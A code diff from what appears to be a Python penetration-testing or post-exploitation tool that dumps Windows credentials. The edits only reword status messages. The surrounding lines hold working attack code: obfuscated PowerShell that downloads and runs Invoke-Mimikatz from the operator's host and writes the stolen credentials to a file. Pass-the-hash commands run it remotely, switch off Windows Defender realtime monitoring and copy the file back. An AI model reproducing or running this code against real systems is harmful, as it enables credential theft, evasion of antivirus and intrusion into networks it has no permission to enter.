@@ -524,7 +524,7 @@ def datadump(user, passw, host, path, os_version):
 						if "UseLogonCredential    REG_DWORD    0x0" in stdout_value:
 							print colored("[-]The reg value UseLogonCredential is set to 0 - no cleartext credentials will be available, use the -rW e/d/q parameter to modify this value",'green')
 						else:
-							print colored("[+]UseLogonCredential Registry Value is set to 1 - cleartext credentials will be hopefully be available",'green')
+							print colored("[+]UseLogonCredential Registry Value is set to 1 - cleartext credentials will hopefully be available",'green')
 
 						#If Windows Defender is turned on turn off 
 						if AVstatus=='On':
@@ -538,9 +538,9 @@ def datadump(user, passw, host, path, os_version):
 					else:
 						line = "iex ((&(`G`C`M *w-O*) \"N`Et`.`WeBc`LiEnt\").\"DO`wNlo`AdSt`RiNg\"('http://"+str(my_ip).rstrip('\n')+":"+str(PORT)+"/a'));"+randint(1,50)*x+"Invoke-Mimikatz"+randint(1,50)*x+" -DumpCreds > c:\\creds.txt"
 					
-					print colored("Using: "+line,'yellow')
+					print colored("[+]Using: "+line,'yellow')
 					en = b64encode(line.encode('UTF-16LE'))
-					print colored("Encoding command: "+en,'yellow')
+					print colored("[+]Encoding command: "+en,'yellow')
 					
 					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null")
 					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get creds.txt\' 2>/dev/null")
@@ -549,7 +549,7 @@ def datadump(user, passw, host, path, os_version):
 					if "Windows 10.0" in os_version:
 						#If Windows Defender AV status was on, turn it back on
 						if AVstatus=='On':
-							print colored("[+]Turning back on Windows Defender Realtime Monitoring...",'blue')
+							print colored("[+]Turning Windows Defender Realtime Monitoring back on...",'blue')
 							line="Set-MpPreference -DisableRealtimeMonitoring $false\n"
 							en = b64encode(line.encode('UTF-16LE'))						
 							os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null")
